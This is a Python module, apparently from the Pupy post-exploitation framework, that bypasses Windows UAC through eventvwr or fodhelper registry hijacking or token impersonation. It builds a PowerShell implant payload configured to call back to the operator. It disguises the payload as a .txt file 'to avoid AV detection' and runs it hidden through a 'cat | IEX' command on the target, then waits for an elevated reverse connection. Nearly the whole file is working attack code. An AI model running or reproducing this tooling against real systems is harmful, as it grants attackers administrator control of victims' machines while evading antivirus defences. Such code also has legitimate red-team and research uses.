# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
import pupygen
import random
import string

__class_name__="BypassUAC"

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):

    """
    Try to bypass UAC
    
    By default, each bypass UAC method uses a ps1 script which is executed on the target. 
    By default and automatically:
      - eventvwr is used on Windows 7, 8 and some Win10 build (>= 7600)
      - fodhelper is used on Win10 build >= 10240
      - tokenimp is used on other cases
    If you don't want a method uses a ps1 script, you can choose an exe file: The file is uploaded and it is used by the bypass method.
    If the parent launcher is using a reverse connection (e.g. connect or auto_proxy), the child launcher (created by the bypass UAC method) will use the same configuration:
    The child launcher will connect to you.
    If the parent launcher is using a bind connection, the child launcher (created by the bypass UAC method) will use the same configuration:
    The child launcher will listen on a specific port on the target and it will wait a connection. In this case, this module will ask you a bind port.
    """

    dependencies=['pupwinutils.bypassuac_token_imp','pupwinutils.bypassuac_registry', 'pupwinutils.security']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "fodhelper", "tokenimp", ], default=None, help="By default, a method will be found for you depending on your build version")
        self.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
        self.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")

    def run(self, args):

        #True if ps1 script will be used in bind mode. If reverse connection with ps1 then False
        isBindLauncherForPs1 = False
        #Contains ip:port used for bind connection on the target with ps1 script. None if reverse connection and (consequently) isBindLauncherForPs1==False
        listeningAddressPortForBindPs1 = None
        #Usefull information for bind mode connection (ps1 script)
        launcherType, launcherArgs, addressPort = self.client.desc['launcher'], self.client.desc['launcher_args'], self.client.desc['address']
        #Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
        if launcherType == "bind":
            self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
            isBindLauncherForPs1 = True
        else:
            self.info('The current pupy launcher is using a REVERSE connection (e.g. \'auto_proxy\' or \'connect\' launcher)')
            isBindLauncherForPs1 = False
        #Parsing bypassuac methods
        method = args.method
        if not method:
            windows_info = self.client.conn.modules["pupwinutils.security"].get_windows_version()
            if windows_info:
                # check if your host is previous Vista
                if float(str('%s.%s' % (windows_info['major_version'], windows_info['minor_version']))) < 6.0:
                    self.success('You are lucky, this Windows version does not implement UAC.')
                    return

                # Windows 10
                if windows_info['build_number'] >= 10240:
                    method = 'fodhelper'

                # Windows 7, 8 and some Win10 build
                elif windows_info['build_number'] >= 7600:
                    method = 'eventvwr'

                else:
                    method = 'tokenimp'
            elif not windows_info:
                self.error('No bypassuac method has been found automatically, you should do it manually using the "-m" option')
                return
            self.success('The following bypass uac method has been selected automatically: {0}'.format(method))

        # check if a UAC bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        # ------------------ Prepare the payload ------------------

        ros         = self.client.conn.modules['os']
        rtempfile   = self.client.conn.modules['tempfile']
        tempdir     = rtempfile.gettempdir()
        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
        local_file  = ''
        remotefile  = ''

        # use powershell
        if not args.exe and not args.restart:
            clientConfToUse = None
            self.info('Using powershell payload')
            if isBindLauncherForPs1 == True:
                self.info("BIND launcher is on the target. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port")
                self.info("Be careful, you have to choose a port which is not used on the target!")
                listeningPort = -1
                while listeningPort==-1:
                    try:
                        listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again")
                listeningAddress = addressPort.split(':')[0]
                listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                self.info("The ps1 script used for bypassing UAC will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
                bindConf = self.client.get_conf()
                #Modify the listening port on the conf. If it is not modified, the ps1 script will listen on the same port as the inital pupy launcher on the target
                bindConf['launcher_args'][bindConf['launcher_args'].index("--port")+1] = str(listeningPort)
                clientConfToUse = bindConf
            else:
                self.info("Reverse connection mode: Configuring ps1 client with the same configuration as the (parent) launcher on the target")
                clientConfToUse = self.client.get_conf()
            if method == "eventvwr":
                #Specific case for eventvwr method
                if '64' in  self.client.desc['proc_arch']:
                    local_file = pupygen.generate_ps1(clientConfToUse, x64=True)
                else:
                    local_file = pupygen.generate_ps1(clientConfToUse, x86=True)
            else:
                if '64' in  self.client.desc['os_arch']:
                    local_file = pupygen.generate_ps1(clientConfToUse, x64=True)
                else:
                    local_file = pupygen.generate_ps1(clientConfToUse, x86=True)

            # change the ps1 to txt file to avoid AV detection
            random_name += '.txt'
            remotefile  = ros.path.join(tempdir, random_name)

            cmd     = u'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
            param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile

        # use a custom exe to execute as admin
        elif args.exe:
            self.info('Using custom executable')
            if os.path.exists(args.exe):
                local_file  = args.exe

                random_name += '.exe'
                remotefile  = ros.path.join(tempdir, random_name)

                cmd     = remotefile
                param   = u''

            else:
                self.error('Executable file not found: %s' % args.exe)
                return

        # restart the current executable as admin
        else:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd     = self.client.desc['exec_path']
            param   = u''

        # upload payload (ps1 or custom exe)
        if not args.restart:
            self.info("Uploading to %s" % remotefile)
            upload(self.client.conn, local_file, remotefile)

        # ------------------ Ready to launch the bypassuac ------------------

        self.success("Trying to bypass UAC using the '%s' method" % method)

        # Works from: Windows 7 (7600)
        # Fixed in: Windows 10 RS2 (15031)
        if method == "eventvwr":
           self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_eventvwr(cmd, param)

        # Works from: Windows 10 TH1 (10240)
        # Unfixed
        elif method == "fodhelper":
            self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_fodhelper(cmd, param)

        # Works from: Windows 7 (7600)
        # Unfixed
        elif method == "tokenimp":
            param = param.replace('-w hidden ', '')
            self.client.conn.modules["pupwinutils.bypassuac_token_imp"].run_bypass_uac_using_token_impersonation(cmd, param)

        if isBindLauncherForPs1 == True:
            self.success("You have to connect to the target manually on {0}: try 'connect --host {0}' in pupy shell".format(listeningAddressPortForBindPs1))
        else:
            self.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")

        # TO DO (remove ps1 file)
        # ros.remove(remotefile) # not work if removed too fast

        # remove generated ps1 file
        if not args.exe and not args.restart:
            os.remove(local_file)
